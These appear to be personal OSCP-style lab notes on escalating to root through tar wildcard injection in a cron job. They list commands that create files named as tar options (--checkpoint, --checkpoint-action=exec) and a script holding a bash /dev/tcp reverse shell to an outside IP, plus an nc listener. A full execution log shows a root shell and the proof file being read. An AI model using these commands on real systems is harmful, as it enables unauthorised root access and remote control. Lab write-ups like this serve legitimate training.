https://www.exploit-db.com/papers/33930

https://medium.com/@silver-garcia/how-to-abuse-tar-wildcards-for-privilege-escalation-tar-wildcard-injection-612a6eac0807


- 1. First create 
--checkpoint [=NUMBER]
```
echo "" > --checkpoint=1
```

- 2. Action that is our reverse shell body
 --checkpoint-action=ACTION   execute ACTION on each checkpoint
```
echo "" > --checkpoint-action=exec=bash
```

- 3. Calling our rev shell file (Using parenthesis as it has a space)
--checkpoint-action=ACTION   execute ACTION on each checkpoint
```
echo "" > "--checkpoint-action=exec=bash root-shell.sh"
```

- 4. create the the shell file
nano root-shell.sh
```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.175/20000 0>&1
```

- 5. Listen in kali
```
┌──(kali㉿kali)-[~/OSCP-C/Charlie/CVE-2022-0847]
└─$ nc -nlvp 20000
listening on [any] 20000 ...
```


Example

Once we know the cronjob as root user is executed at /opt/admin location we can create a file and use the **Wildcard injection methodology** to get a root shell
In this case using tar functionality of the cronjob:
Location: /etc/cron.d/2minutes
```
sh-5.1$ cat /etc/cron.d/2minutes
cat /etc/cron.d/2minutes
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
```

tar --help
```
┌──(kali㉿kali)-[~/OSCP-C/Charlie]
└─$ tar --help
Informative output:

      --checkpoint[=NUMBER]  display progress messages every NUMBERth record
                             (default 10)
      --checkpoint-action=ACTION   execute ACTION on each checkpoint
      --full-time            print file time to its full resolution
      --index-file=FILE      send verbose output to FILE
  -l, --check-links          print a message if not all links are dumped
      --no-quote-chars=STRING   disable quoting for characters from STRING
      --quote-chars=STRING   additionally quote characters from STRING
      --quoting-style=STYLE  set name quoting style; see below for valid STYLE
                             values
```

### The actual execution

```
cassie@oscp:/tmp$ cd /opt
cassie@oscp:/opt$ ls
admin
cassie@oscp:/opt$ cd admin/
cassie@oscp:/opt/admin$ ls
cassie@oscp:/opt/admin$ nano root-shell.sh
cassie@oscp:/opt/admin$ ls -lhOct  7 20:28 root-shell.sh
total 4.0K                                                                                                          
-rw-r--r-- 1 cassie cassie 58 Oct  7 20:28 root-shell.sh                                                            
cassie@oscp:/opt/admin$ ls                                                                                          
root-shell.sh
cassie@oscp:/opt/admin$ echo "" > --checkpoint-action=exec=bash
cassie@oscp:/opt/admin$ echo "" > --checkpoint-action=exec=bash root-shell.sh
cassie@oscp:/opt/admin$ echo "" > --checkpoint=1
cassie@oscp:/opt/admin$ ls -lh
total 12K
-rw-r--r-- 1 cassie cassie 15 Oct  7 20:35 --checkpoint-action=exec=bash
-rw-r--r-- 1 cassie cassie  1 Oct  7 20:35 --checkpoint=1
-rw-r--r-- 1 cassie cassie 58 Oct  7 20:28 root-shell.sh
cassie@oscp:/opt/admin$ echo "" > "--checkpoint-action=exec=bash root-shell.sh"
cassie@oscp:/opt/admin$ ls -lh
total 16K
-rw-r--r-- 1 cassie cassie 15 Oct  7 20:35 --checkpoint-action=exec=bash
-rw-r--r-- 1 cassie cassie  1 Oct  7 20:36 --checkpoint-action=exec=bash root-shell.sh
-rw-r--r-- 1 cassie cassie  1 Oct  7 20:35 --checkpoint=1
-rw-r--r-- 1 cassie cassie 58 Oct  7 20:28 root-shell.sh
```

```
┌──(kali㉿kali)-[~/OSCP-C/Charlie/CVE-2022-0847]
└─$ nc -nlvp 20000
listening on [any] 20000 ...
connect to [192.168.45.175] from (UNKNOWN) [192.168.240.157] 54852
bash: cannot set terminal process group (44974): Inappropriate ioctl for device
bash: no job control in this shell
root@oscp:/opt/admin# whoami
whoami
root
root@oscp:/opt/admin# cat /root
cat /root
cat: /root: Is a directory
root@oscp:/opt/admin# ls /root
ls /root
proof.txt
snap
root@oscp:/opt/admin# cat /root/proof.txt
cat /root/proof.txt
5ab5a0204f46e029bd125d81005ea878
```